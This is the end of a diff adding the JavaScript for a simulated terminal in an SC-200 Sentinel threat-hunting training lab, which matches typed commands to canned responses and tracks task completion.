rule","cls":"term-line-dim"}],"completesTask":10}};
+
+        function escH(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+        function addLine(t,c) { var d=document.createElement('div'); d.className='term-line'+(c?' '+c:''); d.textContent=t; outputEl.appendChild(d); outputEl.scrollTop=outputEl.scrollHeight; }
+        function addHTML(h,c) { var d=document.createElement('div'); d.className='term-line'+(c?' '+c:''); d.innerHTML=h; outputEl.appendChild(d); outputEl.scrollTop=outputEl.scrollHeight; }
+        function addBlank() { addLine('',''); }
+        function addPromptLine(cmd) { addHTML('<span class="term-prompt-span">socanalyst@hunting-lab</span><span class="term-ps1-sep">:</span><span class="term-path-span">~</span><span class="term-ps1-sep">$ </span>'+escH(cmd),'term-line-cmd'); }
+
+        function execLine(raw) {
+            var trimmed = raw.trim();
+            addPromptLine(trimmed);
+            if (!trimmed) return;
+            var matched = false;
+            for (var key in CMD_RESPONSES) {
+                if (trimmed === key || trimmed.indexOf(key) === 0) {
+                    var resp = CMD_RESPONSES[key];
+                    resp.lines.forEach(function(l) { addLine(l.text, l.cls); });
+                    addBlank();
+                    if (resp.completesTask) { completeTask(resp.completesTask); }
+                    matched = true;
+                    break;
+                }
+            }
+            if (!matched) {
+                if (trimmed === 'help') { addLine('Type the commands shown in the task instructions.', 'term-line-info'); addLine('Each task provides the exact command to run.', 'term-line-dim'); }
+                else if (trimmed === 'clear') { outputEl.innerHTML = ''; }
+                else { addLine('Command not recognized in this lab simulation. Check the task instructions.', 'term-line-err'); }
+            }
+        }
+
+        function completeTask(num) {
+            if (taskDone[num]) return;
+            taskDone[num] = true;
+            var card = document.getElementById('task-card-' + num);
+            if (card) { card.classList.add('completed'); card.classList.remove('active'); }
+            var doneCount = Object.keys(taskDone).filter(function(k){return taskDone[k];}).length;
+            document.getElementById('taskProgress').textContent = doneCount + ' / ' + TOTAL_TASKS + ' Tasks';
+            document.getElementById('progressBarFill').style.width = Math.round((doneCount/TOTAL_TASKS)*100) + '%';
+            addBlank();
+            addHTML('  <span style="color:#34d399">[Task ' + num + ' complete]</span> <span style="color:#5a2020">' + escH(TASK_NAMES[num]||'') + '</span>', 'term-line-info');
+            addBlank();
+            if (doneCount === TOTAL_TASKS) { setTimeout(function(){ document.getElementById('successOverlay').classList.add('active'); }, 700); return; }
+            var next = null; for (var j=1;j<=TOTAL_TASKS;j++) { if (!taskDone[j]) { next=j; break; } }
+            if (next) selectTask(next);
+        }
+
+        function selectTask(num) {
+            currentTask = num;
+            for (var i=1;i<=TOTAL_TASKS;i++) { var c=document.getElementById('task-card-'+i); if(c){c.classList.remove('active'); if(i===num) c.classList.add('active');} }
+            var info = TASK_INSTRUCTIONS[num]; if (!info) return;
+            var stepEl=document.getElementById('instructionsStep'); var hintEl=document.getElementById('instructionsHint'); var hintCmd=document.getElementById('hintCommand');
+            if (stepEl) stepEl.innerHTML = info.step.replace(/\n/g,'<br>');
+            if (hintEl) hintEl.textContent = info.hint;
+            if (hintCmd) { hintCmd.textContent = info.cmd; hintCmd.classList.remove('visible'); }
+            var panel=document.getElementById('instructionsPanel'); if(panel&&panel.classList.contains('collapsed')) panel.classList.remove('collapsed');
+        }
+
+        window.selectTask = selectTask;
+        window.toggleInstructions = function() { document.getElementById('instructionsPanel').classList.toggle('collapsed'); };
+        window.revealHint = function() { var h=document.getElementById('hintCommand'); if(h) h.classList.toggle('visible'); };
+        window.finishLab = function() { if (typeof ModuleProgress !== 'undefined') { ModuleProgress.complete('shield', 'sc200-ch09-lab', { returnUrl: '../index.html' }); } else { window.location.href = '../index.html'; } };
+
+        function init() {
+            outputEl = document.getElementById('termOutput');
+            inputEl = document.getElementById('termInput');
+            ps1PathEl = document.getElementById('termPS1Path');
+            if (!outputEl || !inputEl) return;
+            addLine("Sentinel Threat Hunting Lab -- SC-200 Chapter 9", "term-welcome");
+            addLine("Shield House Threat Hunting Terminal", "term-welcome");
+            addLine("", "term-line-out");
+            addLine("Hunt for threats using KQL, bookmark evidence, monitor with livestream, investigate with notebooks, and promote findings to incidents and analytics rules.", "term-line-info");
+            addLine("Type \"help\" for guidance. Complete 10 tasks to finish the lab.", "term-line-info");
+            addBlank();
+            inputEl.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') { var cmd=inputEl.value; inputEl.value=''; if(cmd.trim()){cmdHistory.push(cmd);histIdx=cmdHistory.length;} execLine(cmd); }
+                else if (e.key === 'ArrowUp') { e.preventDefault(); if(histIdx>0){histIdx--;inputEl.value=cmdHistory[histIdx];} }
+                else if (e.key === 'ArrowDown') { e.preventDefault(); if(histIdx<cmdHistory.length-1){histIdx++;inputEl.value=cmdHistory[histIdx];}else{histIdx=cmdHistory.length;inputEl.value='';} }
+            });
+            outputEl.addEventListener('click', function(){ inputEl.focus(); });
+            inputEl.focus();
+            selectTask(1);
+        }
+        if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); } else { init(); }
+    })();
+    </script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
